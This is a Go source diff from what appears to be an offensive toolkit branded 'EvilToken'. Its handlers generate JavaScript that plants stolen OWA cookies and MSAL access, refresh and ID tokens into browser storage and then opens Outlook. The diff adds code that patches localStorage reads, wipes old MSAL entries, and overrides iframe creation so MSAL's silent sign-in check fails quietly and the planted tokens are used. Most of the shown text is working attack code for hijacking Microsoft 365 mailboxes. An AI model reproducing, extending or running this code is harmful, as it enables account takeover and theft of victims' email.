@@ -1401,10 +1401,15 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	var js strings.Builder
 	entriesJSON, _ := json.Marshal(entries)
 	js.WriteString("(function(){\n")
+	// Patch localStorage.getItem so msal.token.keys.* always returns valid arrays.
+	// Stale entries written by older broken injects had null arrays; MSAL's
+	// migrateIdTokens calls .find() on idToken and crashes on null.
+	js.WriteString("  /* 0a. Guard msal.token.keys.* against null arrays */\n")
+	js.WriteString("  (function(){var _gi=Storage.prototype.getItem;Storage.prototype.getItem=function(k){var v=_gi.call(this,k);if(k&&k.indexOf('msal.token.keys.')===0&&v){try{var p=JSON.parse(v);if(p&&typeof p==='object'){if(!Array.isArray(p.idToken))p.idToken=[];if(!Array.isArray(p.accessToken))p.accessToken=[];if(!Array.isArray(p.refreshToken))p.refreshToken=[];return JSON.stringify(p);}}catch(e){}}return v;};}());\n")
 	// Block MSAL's hidden-iframe ssoSilent: intercept iframe.src writes that contain
 	// prompt=none and immediately fire a load event so MSAL's silent request resolves
 	// (with failure) and falls back to the cache rather than doing loginRedirect.
-	js.WriteString("  /* 0. Patch MSAL hidden-iframe SSO check */\n")
+	js.WriteString("  /* 0b. Patch MSAL hidden-iframe SSO check */\n")
 	js.WriteString("  (function(){var _ce=document.createElement;document.createElement=function(t){var el=_ce.call(document,t);if((t+'').toLowerCase()==='iframe'){var _sa=el.setAttribute.bind(el);el.setAttribute=function(n,v){if(n==='src'&&v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}_sa(n,v);};Object.defineProperty(el,'src',{set:function(v){if(v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}el.setAttribute('src',v);},get:function(){return el.getAttribute('src')||'';},configurable:true});}return el;};}());\n")
 	js.WriteString("  /* 1. OWA session cookies */\n")
 	js.WriteString("  var ck=")
@@ -1415,6 +1420,8 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	js.WriteString("  var d=")
 	js.WriteString(string(entriesJSON))
 	js.WriteString(";\n")
+	js.WriteString("  /* 2b. Wipe any stale MSAL entries (null arrays from old inject crash migrateIdTokens) */\n")
+	js.WriteString("  try{Object.keys(localStorage).filter(function(k){return k.startsWith('msal.');}).forEach(function(k){localStorage.removeItem(k);});}catch(e){}\n")
 	js.WriteString(`  Object.keys(d).forEach(function(k){
     var v=typeof d[k]==='string'?d[k]:JSON.stringify(d[k]);
     try{localStorage.setItem(k,v);}catch(e){}
@@ -1828,10 +1835,14 @@ func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
 	entriesJSON, _ := json.Marshal(entries)
 	var js strings.Builder
 	js.WriteString("(function(){\n")
+	// Guard msal.token.keys.* against null arrays from any prior broken inject.
+	js.WriteString("  (function(){var _gi=Storage.prototype.getItem;Storage.prototype.getItem=function(k){var v=_gi.call(this,k);if(k&&k.indexOf('msal.token.keys.')===0&&v){try{var p=JSON.parse(v);if(p&&typeof p==='object'){if(!Array.isArray(p.idToken))p.idToken=[];if(!Array.isArray(p.accessToken))p.accessToken=[];if(!Array.isArray(p.refreshToken))p.refreshToken=[];return JSON.stringify(p);}}catch(e){}}return v;};}());\n")
 	js.WriteString("  (function(){var _ce=document.createElement;document.createElement=function(t){var el=_ce.call(document,t);if((t+'').toLowerCase()==='iframe'){var _sa=el.setAttribute.bind(el);el.setAttribute=function(n,v){if(n==='src'&&v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}_sa(n,v);};Object.defineProperty(el,'src',{set:function(v){if(v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}el.setAttribute('src',v);},get:function(){return el.getAttribute('src')||'';},configurable:true});}return el;};}());\n")
 	js.WriteString("  var d=")
 	js.WriteString(string(entriesJSON))
 	js.WriteString(";\n")
+	js.WriteString("  /* Wipe any stale MSAL entries — null arrays from prior broken inject crash migrateIdTokens */\n")
+	js.WriteString("  try{Object.keys(localStorage).filter(function(k){return k.startsWith('msal.');}).forEach(function(k){localStorage.removeItem(k);});}catch(e){}\n")
 	js.WriteString("  Object.keys(d).forEach(function(k){\n    var v=typeof d[k]==='string'?d[k]:JSON.stringify(d[k]);\n    try{localStorage.setItem(k,v);}catch(e){}\n    try{sessionStorage.setItem(k,v);}catch(e){}\n  });\n")
 	js.WriteString("  console.log('%c[EvilToken] ✓ MSAL cache written — navigating to OWA...','color:#0a0;font-size:14px;font-weight:bold');\n")
 	js.WriteString("  setTimeout(function(){location.href='https://outlook.cloud.microsoft/mail/';},400);\n")
